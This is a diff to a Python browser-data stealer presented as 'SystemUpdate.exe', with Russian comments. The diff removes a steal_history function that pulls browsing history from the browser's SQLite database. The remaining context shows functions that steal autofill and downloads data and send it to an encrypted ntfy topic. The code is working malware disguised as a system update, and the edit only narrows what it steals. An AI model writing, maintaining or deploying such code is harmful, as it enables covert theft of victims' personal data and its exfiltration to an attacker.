@@ -1,6 +1,7 @@
 # SystemUpdate.exe - Advanced Browser Data Export Utility
 # Зашифрованный топик ntfy, аккуратный вывод по категориям.
 # Если ничего не собрано – отправляет "No data collected".
+# История браузера НЕ собирается.
 import os, json, base64, sqlite3, shutil, subprocess, re, time, socket, platform, sys
 from datetime import datetime
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -216,28 +217,6 @@ def steal_autofill(profile_path, browser):
             os.remove(tmp)
     return result
 
-def steal_history(profile_path, browser):
-    result = []
-    db = os.path.join(profile_path, 'History')
-    if not os.path.exists(db):
-        return result
-    tmp = os.path.join(TEMP, f"hist_{os.urandom(4).hex()}.db")
-    if not safe_copy(db, tmp):
-        return result
-    try:
-        conn = sqlite3.connect(tmp)
-        cur = conn.cursor()
-        cur.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 500")
-        for url, title, count in cur.fetchall():
-            result.append(f"{url} | {title} | visits: {count}")
-        conn.close()
-    except:
-        pass
-    finally:
-        if os.path.exists(tmp):
-            os.remove(tmp)
-    return result
-
 def steal_downloads(profile_path, browser):
     result = []
     db = os.path.join(profile_path, 'History')
@@ -441,11 +420,6 @@ def main():
             if autofill:
                 data_collected = True
                 send_to_ntfy(f"Autofill ({tag})", autofill)
-
-            history = steal_history(profile_path, browser_name)
-            if history:
-                data_collected = True
-                send_to_ntfy(f"History ({tag})", history)
 
             downloads = steal_downloads(profile_path, browser_name)
             if downloads:
